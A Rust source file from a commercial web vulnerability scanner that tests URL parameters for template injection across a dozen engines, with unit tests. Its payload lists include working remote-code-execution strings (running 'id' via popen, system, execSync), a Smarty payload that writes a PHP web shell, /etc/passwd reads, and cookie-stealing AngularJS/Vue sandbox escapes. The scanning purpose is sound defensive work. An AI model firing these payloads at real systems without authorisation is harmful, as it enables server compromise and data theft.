// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

use crate::http_client::HttpClient;
use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability, ScanContext, EndpointType};
use std::sync::Arc;
use tracing::{debug, info};

pub struct TemplateInjectionScanner {
    http_client: Arc<HttpClient>,
}

impl TemplateInjectionScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    /// Scan a parameter for template injection vulnerabilities
    pub async fn scan_parameter(
        &self,
        url: &str,
        param_name: &str,
        _config: &ScanConfig,
        context: Option<&ScanContext>,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // PREMIUM FEATURE: Template Injection requires Professional license
        if !crate::license::is_feature_available("template_injection") {
            debug!("[SSTI] Feature requires Professional license or higher");
            return Ok((vulnerabilities, tests_run));
        }

        // Skip if GraphQL endpoint
        if let Some(ctx) = context {
            if ctx.is_graphql {
                debug!("[SSTI] Skipping GraphQL endpoint");
                return Ok((vulnerabilities, tests_run));
            }

            // Skip if static content
            if matches!(ctx.endpoint_type, EndpointType::StaticContent) {
                debug!("[SSTI] Skipping static content endpoint");
                return Ok((vulnerabilities, tests_run));
            }
        }

        // Smart parameter filtering - skip framework internals
        if ParameterFilter::should_skip_parameter(param_name, ScannerType::Other) {
            debug!("[SSTI] Skipping framework/internal parameter: {}", param_name);
            return Ok((vulnerabilities, tests_run));
        }

        debug!("[SSTI] Testing parameter: {} (priority: {})",
              param_name,
              ParameterFilter::get_parameter_priority(param_name));

        debug!("Testing SSTI on parameter: {}", param_name);

        // Get framework-specific engines based on context
        let engines = self.get_targeted_engines(context);

        for engine in engines {
            let payloads = self.get_engine_payloads(&engine);

            for (payload, description) in payloads {
                tests_run += 1;

                let test_url = if url.contains('?') {
                    format!("{}&{}={}", url, param_name, urlencoding::encode(&payload))
                } else {
                    format!("{}?{}={}", url, param_name, urlencoding::encode(&payload))
                };

                match self.http_client.get(&test_url).await {
                    Ok(response) => {
                        if let Some(vuln) = self.analyze_response(
                            &response.body,
                            &payload,
                            &engine,
                            &description,
                            &test_url,
                            param_name,
                        ) {
                            info!("SSTI vulnerability detected: {} - {}", engine, &description);
                            vulnerabilities.push(vuln);
                            return Ok((vulnerabilities, tests_run)); // Stop testing this parameter
                        }
                    }
                    Err(e) => {
                        debug!("Request failed: {}", e);
                    }
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Scan endpoint for template injection (general scan)
    pub async fn scan(
        &self,
        _url: &str,
        _config: &ScanConfig,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        // Only test parameters discovered from actual forms/URLs - no spray-and-pray
        // The main scanner will call scan_parameter() with discovered params
        Ok((Vec::new(), 0))
    }

    /// Get targeted template engines based on detected framework
    fn get_targeted_engines(&self, context: Option<&ScanContext>) -> Vec<String> {
        if let Some(ctx) = context {
            // Check for framework-specific engines
            if let Some(framework) = &ctx.framework {
                let fw_lower = framework.to_lowercase();

                // Django/Flask → Jinja2 payloads only
                if fw_lower.contains("django") || fw_lower.contains("flask") {
                    info!("[SSTI] Detected Django/Flask - using Jinja2 payloads");
                    return vec!["jinja2".to_string()];
                }

                // Laravel → Blade payloads only
                if fw_lower.contains("laravel") {
                    info!("[SSTI] Detected Laravel - using Blade payloads");
                    return vec!["blade".to_string()];
                }

                // Ruby/Rails → ERB payloads
                if fw_lower.contains("rails") || fw_lower.contains("ruby") {
                    info!("[SSTI] Detected Rails/Ruby - using ERB payloads");
                    return vec!["erb".to_string()];
                }

                // Node.js/Express → Pug/EJS/Handlebars payloads
                if fw_lower.contains("express") || fw_lower.contains("node") {
                    info!("[SSTI] Detected Express/Node.js - using Pug/EJS/Handlebars payloads");
                    return vec!["pug".to_string(), "ejs".to_string(), "handlebars".to_string()];
                }

                // Vue.js → Client-Side Template Injection (CSTI)
                if fw_lower.contains("vue") {
                    info!("[CSTI] Detected Vue.js - using Vue CSTI payloads");
                    return vec!["vuejs".to_string()];
                }

                // Angular → Client-Side Template Injection (CSTI)
                if fw_lower.contains("angular") {
                    info!("[CSTI] Detected Angular - using Angular CSTI payloads");
                    return vec!["angular".to_string()];
                }

                // React → Client-Side Template Injection (limited)
                if fw_lower.contains("react") {
                    info!("[CSTI] Detected React - using React CSTI payloads");
                    return vec!["react".to_string()];
                }
            }

            // Check detected technologies for PHP frameworks
            if ctx.has_tech("php") || ctx.has_tech("symfony") {
                info!("[SSTI] Detected PHP - using Twig/Smarty payloads");
                return vec!["twig".to_string(), "smarty".to_string()];
            }

            // Check for Java frameworks → FreeMarker
            if ctx.has_tech("java") || ctx.has_tech("tomcat") || ctx.has_tech("spring") {
                info!("[SSTI] Detected Java - using FreeMarker payloads");
                return vec!["freemarker".to_string()];
            }
        }

        // Default: test all common engines if no framework detected
        debug!("[SSTI] No specific framework detected - using all template engines");
        vec![
            "jinja2".to_string(),
            "freemarker".to_string(),
            "twig".to_string(),
            "smarty".to_string(),
        ]
    }

    /// Get payloads for specific template engine
    fn get_engine_payloads(&self, engine: &str) -> Vec<(String, String)> {
        match engine {
            "jinja2" => vec![
                // Mathematical evaluation
                ("{{7*7}}".to_string(), "Math evaluation 7*7".to_string()),
                ("{{7*'7'}}".to_string(), "String multiplication".to_string()),
                ("{{config}}".to_string(), "Config object access".to_string()),
                ("{{request}}".to_string(), "Request object access".to_string()),

                // RCE attempts
                ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}".to_string(), "RCE via config".to_string()),
                ("{{''.__class__.__mro__[1].__subclasses__()}}".to_string(), "Class traversal".to_string()),
                ("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}".to_string(), "Import os".to_string()),

                // Detection payloads
                ("{{''.join(['a','b','c'])}}".to_string(), "String join".to_string()),
                ("{{7*7}}{{config.items()}}".to_string(), "Combined evaluation".to_string()),
            ],

            "freemarker" => vec![
                // Mathematical evaluation
                ("${7*7}".to_string(), "Math evaluation 7*7".to_string()),
                ("#{7*7}".to_string(), "Alternate syntax".to_string()),

                // Object access
                ("<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}".to_string(), "RCE via Execute".to_string()),
                ("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.ProcessBuilder\",\"id\").start()}".to_string(), "ProcessBuilder RCE".to_string()),

                // Detection
                ("${'test'.substring(0,1)}".to_string(), "String method".to_string()),
                ("${7*7}${7+7}".to_string(), "Multiple expressions".to_string()),
            ],

            "twig" => vec![
                // Mathematical evaluation
                ("{{7*7}}".to_string(), "Math evaluation 7*7".to_string()),
                ("{{7*'7'}}".to_string(), "String multiplication".to_string()),

                // Object access
                ("{{_self}}".to_string(), "Self object".to_string()),
                ("{{_self.env}}".to_string(), "Environment object".to_string()),
                ("{{_self.env.getFilter}}".to_string(), "Filter access".to_string()),
                ("{{dump(app)}}".to_string(), "App dump".to_string()),

                // RCE attempts
                ("{{['id']|map('system')|join}}".to_string(), "System via map filter".to_string()),
                ("{{['id','id']|filter('system')}}".to_string(), "System via filter".to_string()),

                // Detection
                ("{{\"test\"|upper}}".to_string(), "String filter".to_string()),
            ],

            "smarty" => vec![
                // Mathematical evaluation
                ("{7*7}".to_string(), "Math evaluation 7*7".to_string()),
                ("{$smarty.version}".to_string(), "Smarty version".to_string()),

                // RCE attempts
                ("{php}echo `id`;{/php}".to_string(), "PHP tag execution".to_string()),
                ("{literal}{php}system('id');{/php}{/literal}".to_string(), "PHP in literal".to_string()),
                ("{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}".to_string(), "File write".to_string()),

                // Detection
                ("{$smarty.get.test}".to_string(), "GET variable".to_string()),
                ("{if 7*7==49}vulnerable{/if}".to_string(), "Conditional".to_string()),
            ],

            "blade" => vec![
                // Mathematical evaluation
                ("{{7*7}}".to_string(), "Math evaluation 7*7".to_string()),
                ("{{ 7*7 }}".to_string(), "Math evaluation with spaces".to_string()),

                // PHP code execution (Blade allows raw PHP)
                ("@php echo 7*7; @endphp".to_string(), "PHP directive".to_string()),
                ("@php system('id'); @endphp".to_string(), "PHP system command".to_string()),

                // Variable access
                ("{{$app}}".to_string(), "App object access".to_string()),
                ("{{config('app')}}".to_string(), "Config access".to_string()),

                // Detection
                ("@{{7*7}}".to_string(), "Escaped expression check".to_string()),
            ],

            "erb" => vec![
                // Mathematical evaluation
                ("<%= 7*7 %>".to_string(), "Math evaluation 7*7".to_string()),
                ("<%= 7 * 7 %>".to_string(), "Math with spaces".to_string()),

                // Command execution
                ("<%= `id` %>".to_string(), "Command via backticks".to_string()),
                ("<%= system('id') %>".to_string(), "System command".to_string()),
                ("<%= %x(id) %>".to_string(), "Command via %x".to_string()),

                // Object access
                ("<%= Dir.entries('/') %>".to_string(), "Directory listing".to_string()),
                ("<%= File.read('/etc/passwd') %>".to_string(), "File read".to_string()),

                // Detection
                ("<% 7*7 %>".to_string(), "Silent evaluation".to_string()),
            ],

            "pug" => vec![
                // Mathematical evaluation
                ("#{7*7}".to_string(), "Math evaluation 7*7".to_string()),
                ("= 7*7".to_string(), "Buffered code".to_string()),

                // Command execution
                ("- var x = process.mainModule.require('child_process').execSync('id').toString()".to_string(), "Command execution".to_string()),
                ("#{global.process.mainModule.require('child_process').execSync('id')}".to_string(), "Inline command".to_string()),

                // Object access
                ("#{process.version}".to_string(), "Process version".to_string()),
                ("#{global}".to_string(), "Global object".to_string()),

                // Detection
                ("- var test = 7*7".to_string(), "Unbuffered code".to_string()),
            ],

            "ejs" => vec![
                // Mathematical evaluation
                ("<%= 7*7 %>".to_string(), "Math evaluation 7*7".to_string()),
                ("<%- 7*7 %>".to_string(), "Unescaped output".to_string()),

                // Command execution
                ("<%= global.process.mainModule.require('child_process').execSync('id').toString() %>".to_string(), "Command execution".to_string()),
                ("<%- global.process.mainModule.constructor._load('child_process').execSync('id') %>".to_string(), "Alternative exec".to_string()),

                // Object access
                ("<%= process.version %>".to_string(), "Process version".to_string()),
                ("<%= global %>".to_string(), "Global object".to_string()),

                // Detection
                ("<% var x = 7*7 %>".to_string(), "Scriptlet".to_string()),
            ],

            "handlebars" => vec![
                // Mathematical evaluation (limited in Handlebars)
                ("{{7*7}}".to_string(), "Expression test".to_string()),
                ("{{this}}".to_string(), "Context access".to_string()),

                // Prototype pollution / RCE attempts
                ("{{#with \"constructor\"}}{{#with ../constructor}}{{#with constructor}}{{#with ../constructor}}{{lookup . 'eval'}}('return process'){{/with}}{{/with}}{{/with}}{{/with}}".to_string(), "Prototype chain".to_string()),
                ("{{lookup (lookup this 'constructor') 'prototype'}}".to_string(), "Prototype access".to_string()),

                // Helper exploitation
                ("{{#each this}}{{@key}}: {{this}}{{/each}}".to_string(), "Object enumeration".to_string()),
                ("{{#with this as |obj|}}{{obj.constructor.prototype}}{{/with}}".to_string(), "Constructor access".to_string()),

                // Detection
                ("{{.}}".to_string(), "Current context".to_string()),
            ],

            // Vue.js Client-Side Template Injection (CSTI)
            "vuejs" => vec![
                // Basic evaluation - Vue.js uses {{ }} for interpolation
                ("{{7*7}}".to_string(), "Vue.js math evaluation".to_string()),
                ("{{constructor.constructor('return 7*7')()}}".to_string(), "Constructor chain execution".to_string()),

                // DOM XSS via Vue CSTI
                ("{{alert(1)}}".to_string(), "Direct alert injection".to_string()),
                ("{{alert(document.cookie)}}".to_string(), "Cookie theft via CSTI".to_string()),
                ("{{alert(document.domain)}}".to_string(), "Domain leak via CSTI".to_string()),

                // $emit constructor bypass (from bug bounty tip)
                ("{{$emit.constructor('alert(document.cookie)')()}}".to_string(), "$emit constructor XSS".to_string()),
                ("{{$emit.constructor`alert(document.cookie)`()}}".to_string(), "$emit constructor with backticks".to_string()),

                // Vue.js specific objects
                ("{{$data}}".to_string(), "Vue data object access".to_string()),
                ("{{$el}}".to_string(), "Vue element access".to_string()),
                ("{{$root}}".to_string(), "Vue root instance access".to_string()),
                ("{{$refs}}".to_string(), "Vue refs access".to_string()),
                ("{{$options}}".to_string(), "Vue options access".to_string()),

                // Advanced constructor bypasses
                ("{{_c.constructor('alert(1)')()}}".to_string(), "_c constructor bypass".to_string()),
                ("{{_v.constructor('alert(1)')()}}".to_string(), "_v constructor bypass".to_string()),
                ("{{_self.constructor.constructor('alert(1)')()}}".to_string(), "_self double constructor".to_string()),

                // Filter bypass with String.fromCharCode
                ("{{constructor.constructor('alert(String.fromCharCode(88,83,83))')()}}".to_string(), "CharCode bypass".to_string()),

                // Prototype chain exploitation
                ("{{this.constructor.constructor('alert(1)')()}}".to_string(), "this.constructor chain".to_string()),
                ("{{[].constructor.constructor('alert(1)')()}}".to_string(), "Array constructor chain".to_string()),
                ("{{''['constructor']['constructor']('alert(1)')()}}".to_string(), "String bracket notation".to_string()),

                // v-html directive detection (leads to XSS)
                ("{{_c('div',{domProps:{innerHTML:'<img src=x onerror=alert(1)>'}})}}".to_string(), "v-html injection".to_string()),
            ],

            // AngularJS Client-Side Template Injection (CSTI)
            "angular" => vec![
                // Basic evaluation
                ("{{7*7}}".to_string(), "Angular math evaluation".to_string()),
                ("{{constructor.constructor('return 7*7')()}}".to_string(), "Constructor chain".to_string()),

                // AngularJS sandbox bypass (< 1.6)
                ("{{constructor.constructor('alert(1)')()}}".to_string(), "Sandbox bypass alert".to_string()),
                ("{{$on.constructor('alert(1)')()}}".to_string(), "$on constructor bypass".to_string()),
                ("{{$watch.constructor('alert(1)')()}}".to_string(), "$watch constructor bypass".to_string()),

                // AngularJS 1.x sandbox escapes
                ("{{'a]'.constructor.prototype.charAt=[].join;$eval('x]alert(1)')}}".to_string(), "charAt sandbox escape".to_string()),
                ("{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x]alert(1)');}}".to_string(), "Prototype pollution escape".to_string()),

                // $scope access
                ("{{$id}}".to_string(), "Scope ID access".to_string()),
                ("{{$parent}}".to_string(), "Parent scope access".to_string()),
                ("{{$root}}".to_string(), "Root scope access".to_string()),

                // Modern Angular (2+) is safer, but check for unsafe bindings
                ("{{constructor}}".to_string(), "Constructor access check".to_string()),

                // orderBy filter exploit
                ("{{'a]'.constructor.prototype.charAt=''.valueOf;$eval('x]alert(1)')}}".to_string(), "valueOf exploit".to_string()),

                // ng-init exploitation
                ("{{$eval('alert(1)')}}".to_string(), "$eval injection".to_string()),
            ],

            // React CSTI (limited - mostly dangerouslySetInnerHTML)
            "react" => vec![
                // React doesn't use {{ }} but check for JSX injection points
                ("{7*7}".to_string(), "JSX expression".to_string()),

                // dangerouslySetInnerHTML detection (indirect)
                ("<img src=x onerror=alert(1)>".to_string(), "HTML injection for dangerouslySetInnerHTML".to_string()),
                ("<svg onload=alert(1)>".to_string(), "SVG injection".to_string()),

                // Template literal injection
                ("${alert(1)}".to_string(), "Template literal injection".to_string()),
                ("${7*7}".to_string(), "Template literal math".to_string()),

                // Next.js specific
                ("{{constructor.constructor('alert(1)')()}}".to_string(), "Constructor chain (if using templating)".to_string()),
            ],

            _ => vec![],
        }
    }

    /// Analyze response for template injection indicators
    fn analyze_response(
        &self,
        body: &str,
        payload: &str,
        engine: &str,
        description: &str,
        url: &str,
        param_name: &str,
    ) -> Option<Vulnerability> {
        // Check for mathematical evaluation (7*7 = 49)
        if payload.contains("7*7") {
            if body.contains("49") {
                return Some(self.create_vulnerability(
                    url,
                    param_name,
                    payload,
                    engine,
                    description,
                    "Template expression evaluated: 7*7 = 49",
                    Confidence::High,
                    Severity::Critical,
                ));
            }

            // Check for "fortynine" or similar
            if body.to_lowercase().contains("fortynine") || body.to_lowercase().contains("forty-nine") {
                return Some(self.create_vulnerability(
                    url,
                    param_name,
                    payload,
                    engine,
                    description,
                    "Mathematical expression evaluated in template (textual)",
                    Confidence::High,
                    Severity::Critical,
                ));
            }
        }

        // Check for string multiplication (7*'7' = 7777777)
        if payload.contains("7*'7'") && body.contains("7777777") {
            return Some(self.create_vulnerability(
                url,
                param_name,
                payload,
                engine,
                description,
                "String multiplication in template: 7*'7' = 7777777",
                Confidence::High,
                Severity::Critical,
            ));
        }

        // Engine-specific detection
        let detected = match engine {
            "jinja2" => {
                body.contains("jinja") ||
                body.contains("<class") ||
                body.contains("__mro__") ||
                body.contains("__subclasses__") ||
                body.contains("__builtins__") ||
                (payload.contains("config") && body.contains("Config"))
            },

            "freemarker" => {
                body.contains("freemarker") ||
                body.contains("FreeMarker") ||
                body.contains("TemplateException") ||
                (payload.contains("Execute") && body.contains("uid="))
            },

            "twig" => {
                body.contains("_self") ||
                body.contains("Twig") ||
                body.contains("TwigEnvironment") ||
                (payload.contains("dump(app)") && body.contains("app"))
            },

            "smarty" => {
                body.contains("Smarty") ||
                body.contains("{php}") ||
                body.contains("{/php}") ||
                body.contains("Smarty_Internal")
            },

            "blade" => {
                body.contains("Blade") ||
                body.contains("Laravel") ||
                (payload.contains("@php") && body.contains("49")) ||
                (payload.contains("$app") && body.contains("Illuminate"))
            },

            "erb" => {
                body.contains("ERB") ||
                body.contains("Ruby") ||
                (payload.contains("Dir.entries") && body.contains("[")) ||
                (payload.contains("File.read") && body.contains("root:"))
            },

            "pug" => {
                body.contains("Pug") ||
                body.contains("Jade") ||
                (payload.contains("process.version") && body.contains("v")) ||
                (payload.contains("global") && body.contains("Object"))
            },

            "ejs" => {
                body.contains("EJS") ||
                (payload.contains("process.version") && body.contains("v")) ||
                (payload.contains("global") && body.contains("Object"))
            },

            "handlebars" => {
                body.contains("Handlebars") ||
                body.contains("prototype") ||
                (payload.contains("constructor") && body.contains("function"))
            },

            _ => false,
        };

        if detected {
            return Some(self.create_vulnerability(
                url,
                param_name,
                payload,
                engine,
                description,
                &format!("{} template engine detected in response", engine),
                Confidence::Medium,
                Severity::High,
            ));
        }

        // Check for command execution output
        let cmd_indicators = vec![
            "uid=", "gid=",  // Unix id command
            "root:", "user:",  // User info
            "/bin/", "/usr/",  // Paths
            "Administrator", "SYSTEM",  // Windows
        ];

        for indicator in cmd_indicators {
            if body.contains(indicator) {
                return Some(self.create_vulnerability(
                    url,
                    param_name,
                    payload,
                    engine,
                    description,
                    &format!("Command execution detected: {}", indicator),
                    Confidence::High,
                    Severity::Critical,
                ));
            }
        }

        None
    }

    /// Create a vulnerability record
    fn create_vulnerability(
        &self,
        url: &str,
        param_name: &str,
        payload: &str,
        engine: &str,
        description: &str,
        evidence: &str,
        confidence: Confidence,
        severity: Severity,
    ) -> Vulnerability {
        let cvss = match severity {
            Severity::Critical => 9.8,
            Severity::High => 8.5,
            Severity::Medium => 6.5,
            _ => 4.0,
        };

        let verified = matches!(confidence, Confidence::High);

        Vulnerability {
            id: format!("ssti_{}", uuid::Uuid::new_v4()),
            vuln_type: format!("Server-Side Template Injection ({})", engine.to_uppercase()),
            severity,
            confidence,
            category: "Injection".to_string(),
            url: url.to_string(),
            parameter: Some(param_name.to_string()),
            payload: payload.to_string(),
            description: format!(
                "Server-Side Template Injection ({}) in parameter '{}': {}",
                engine, param_name, description
            ),
            evidence: Some(evidence.to_string()),
            cwe: "CWE-94".to_string(),
            cvss: cvss as f32,
            verified,
            false_positive: false,
            remediation: format!(
                "1. Never use user input in template expressions\n\
                 2. Use sandboxed template environments (SandboxedEnvironment for Jinja2)\n\
                 3. Avoid server-side template rendering with user input\n\
                 4. Implement input validation and sanitization\n\
                 5. Use logic-less template engines (Mustache, Handlebars)\n\
                 6. Disable dangerous template functions ({} specific)\n\
                 7. Apply principle of least privilege to template context",
                engine
            ),
            discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
        }
    }
}

// UUID generation helper
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::detection_helpers::AppCharacteristics;
use crate::http_client::HttpClient;
    use std::sync::Arc;

    fn create_test_scanner() -> TemplateInjectionScanner {
        let http_client = Arc::new(HttpClient::new(30, 3).unwrap());
        TemplateInjectionScanner::new(http_client)
    }

    #[test]
    fn test_analyze_jinja2_math_evaluation() {
        let scanner = create_test_scanner();

        let body = "Result: 49";
        let result = scanner.analyze_response(
            body,
            "{{7*7}}",
            "jinja2",
            "Math evaluation",
            "http://example.com",
            "template",
        );

        assert!(result.is_some());
        let vuln = result.unwrap();
        assert_eq!(vuln.cwe, "CWE-94");
        assert_eq!(vuln.severity, Severity::Critical);
    }

    #[test]
    fn test_analyze_string_multiplication() {
        let scanner = create_test_scanner();

        let body = "Output: 7777777";
        let result = scanner.analyze_response(
            body,
            "{{7*'7'}}",
            "jinja2",
            "String multiplication",
            "http://example.com",
            "name",
        );

        assert!(result.is_some());
        let vuln = result.unwrap();
        assert!(vuln.description.contains("jinja2"));
    }

    #[test]
    fn test_analyze_jinja2_class_detection() {
        let scanner = create_test_scanner();

        let body = "<class 'flask.config.Config'>";
        let result = scanner.analyze_response(
            body,
            "{{config}}",
            "jinja2",
            "Config access",
            "http://example.com",
            "template",
        );

        assert!(result.is_some());
        let vuln = result.unwrap();
        assert_eq!(vuln.severity, Severity::High);
    }

    #[test]
    fn test_analyze_command_execution() {
        let scanner = create_test_scanner();

        let body = "uid=1000(user) gid=1000(user)";
        let result = scanner.analyze_response(
            body,
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "jinja2",
            "RCE attempt",
            "http://example.com",
            "data",
        );

        assert!(result.is_some());
        let vuln = result.unwrap();
        assert_eq!(vuln.severity, Severity::Critical);
        assert!(vuln.evidence.unwrap().contains("uid="));
    }

    #[test]
    fn test_analyze_freemarker_detection() {
        let scanner = create_test_scanner();

        let body = "FreeMarker Template Error";
        let result = scanner.analyze_response(
            body,
            "${7*7}",
            "freemarker",
            "Math evaluation",
            "http://example.com",
            "view",
        );

        assert!(result.is_some());
        let vuln = result.unwrap();
        assert!(vuln.vuln_type.contains("FREEMARKER"));
    }

    #[test]
    fn test_analyze_twig_detection() {
        let scanner = create_test_scanner();

        let body = "Twig_Environment object";
        let result = scanner.analyze_response(
            body,
            "{{_self.env}}",
            "twig",
            "Environment access",
            "http://example.com",
            "template",
        );

        assert!(result.is_some());
    }

    #[test]
    fn test_analyze_smarty_detection() {
        let scanner = create_test_scanner();

        let body = "Smarty version 3.1.39";
        let result = scanner.analyze_response(
            body,
            "{$smarty.version}",
            "smarty",
            "Version detection",
            "http://example.com",
            "page",
        );

        assert!(result.is_some());
        let vuln = result.unwrap();
        assert!(vuln.vuln_type.contains("SMARTY"));
    }

    #[test]
    fn test_analyze_safe_response() {
        let scanner = create_test_scanner();

        let body = "Normal page content without template injection";
        let result = scanner.analyze_response(
            body,
            "{{7*7}}",
            "jinja2",
            "Test",
            "http://example.com",
            "q",
        );

        assert!(result.is_none());
    }

    #[test]
    fn test_get_jinja2_payloads() {
        let scanner = create_test_scanner();
        let payloads = scanner.get_engine_payloads("jinja2");

        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|(p, _)| p.contains("7*7")));
        assert!(payloads.iter().any(|(p, _)| p.contains("config")));
    }

    #[test]
    fn test_get_freemarker_payloads() {
        let scanner = create_test_scanner();
        let payloads = scanner.get_engine_payloads("freemarker");

        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|(p, _)| p.contains("${")));
    }

    #[test]
    fn test_create_vulnerability() {
        let scanner = create_test_scanner();

        let vuln = scanner.create_vulnerability(
            "http://example.com/search",
            "q",
            "{{7*7}}",
            "jinja2",
            "Math evaluation",
            "Expression evaluated: 49",
            Confidence::High,
            Severity::Critical,
        );

        assert_eq!(vuln.vuln_type, "Server-Side Template Injection (JINJA2)");
        assert_eq!(vuln.severity, Severity::Critical);
        assert_eq!(vuln.cwe, "CWE-94");
        assert_eq!(vuln.cvss, 9.8);
        assert!(vuln.verified);
    }
}
